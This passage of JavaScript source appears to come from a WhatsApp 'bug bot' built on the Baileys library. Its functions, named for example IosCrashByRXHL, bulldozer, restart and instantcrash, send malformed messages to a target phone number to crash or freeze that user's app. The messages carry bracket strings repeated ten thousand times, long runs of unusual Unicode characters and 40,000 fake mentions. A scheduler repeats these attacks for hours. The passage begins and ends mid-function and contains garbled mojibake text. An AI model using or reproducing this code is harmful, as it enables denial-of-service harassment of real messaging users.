                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: XeonBotInc.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
//==============================================================\\
async function CorosuelInvis77(X, mention = true) {
  const videoServer = await prepareWAMessageMedia({
    video: {
      url: "https://files.catbox.moe/qh28k1.mp4"
    }
  }, {
    upload: XeonBotInc.waUploadToServer
  });

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: {
        ...videoServer,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "[".repeat(10000)
      }
    });
  }

  const etc = await generateWAMessageFromContent(X, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `( 🍷HCS ) #Explanation`
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: [X]
          }
        }
      }
    }
  }), {
    userJid: X,
    quoted: null
  });

await XeonBotInc.relayMessage("status@broadcast", etc.message, {
        messageId: etc.key.id,
        statusJidList: [X],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: X },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(
            X,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: etc.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.green('─────「 ⏤CrashSqlStatus Crashv4 」─────'));
}
//==============================================================\\
async function restart(target, mention = true) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "\u0007".repeat(30000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: [],
                    }
                }
            }
        }
    }), { userJid: target });

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.green('─────「 ⏤WeForRen ! 」─────'));
}
//==============================================================\\
const IosCrashByRXHL = async (X) => {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(15000),
         address: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(5000),
         url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
            matchedText: "https://t.me/rxhlvro",
            description: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            title: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = await generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await XeonBotInc.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await XeonBotInc.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

//==============================================================\\
async function bulldozer(target) {
	try{
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  console.log(chalk.green(`Delay strong sent to ${target}`));
  } catch (err) {
      console.error(err);
   }
}
  
  // delay
async function trashprotocol(target, mention) {
	try{
    const mentionedList = [
        "01096379348@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`Delay medium restart sent to ${target}`));
} catch (err) {
      console.error(err);
   }
}

async function restarti(target, mention = true) {
	try{
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        ephemeralMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "\u0007".repeat(30000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: [],
                    }
                }
            }
        }
    }), { userJid: target });

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Telegram:  13" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.green(`Delay medium sent to ${target}`));
    } catch (err) {
      console.error(err);
   }
}
async function XeonDelay1(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    while (Date.now() - batchStart < batchDuration) {
      try {
        await Promise.all([trashprotocol(target), restarti(target), bulldozer(target)]);
        console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 📟 └────────────────────────┘ `));
        await new Promise(resolve => setTimeout(resolve, 900));
      } catch (error) {
        console.error(`❌Error while sending : ${error.message}`);
        if (
        error?.output?.statusCode === 428 ||
        error?.output?.statusCode === 408 ||
        error.message.includes('Connection Closed') ||
        error.message.includes('Timed out') ||
        error.code === 'ECONNABORTED'
      ) {
        console.log(`⚠️ Bug ended for ${target} due to baileys error!`);
        return; // Stop the process by not scheduling another sendNext
      }
        await new Promise(resolve => setTimeout(resolve, 700));
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}
//==============================================================\\

async function Uitoya(target) {
  try {
    const Toyaexe2 = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const Toyaexe = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "BODY here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address:" Telegram@lo_tus_19" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "Telegram@lo_tus_19" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      Toyaexe2,
      headerType: 6
    };

    await XeonBotInc.sendMessage(target, Toyaexe);
  } catch (err) {
  }
}
//==============================================================\\
async function xeonAndroSpam(targetNumber){
   let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(9000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "01096379348@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await XeonBotInc.relayMessage(targetNumber, message, {
      messageId: null,
      participant: { jid: targetNumber },
      userJid: targetNumber,
    });
    }

async function xeonAndroSpamGp(targetNumber){
   let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(9000),
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "01096379348@s.whatsapp.net"],
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
            messageParamsJson: "[{".repeat(10000),
          },
        },
      },
    },
  };
  await XeonBotInc.relayMessage(targetNumber, message, {
      messageId: null,
      userJid: targetNumber,
    });
    }
  
  async function xeonSpamDroid2(target){
  	let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Telegram: @lo_tus_19",
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "01096379348@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "[{".repeat(10000),
            },
          },
        },
      },
    };
    
    await XeonBotInc.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    }
    //==============================================================\\
    async function instantcrash(target) {
  try {
  for (let i = 0; i < 300; i++) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: `⧽› ⟠\n馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/RenXiter${"𑇂𑆵𑆴𑆿".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "[".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
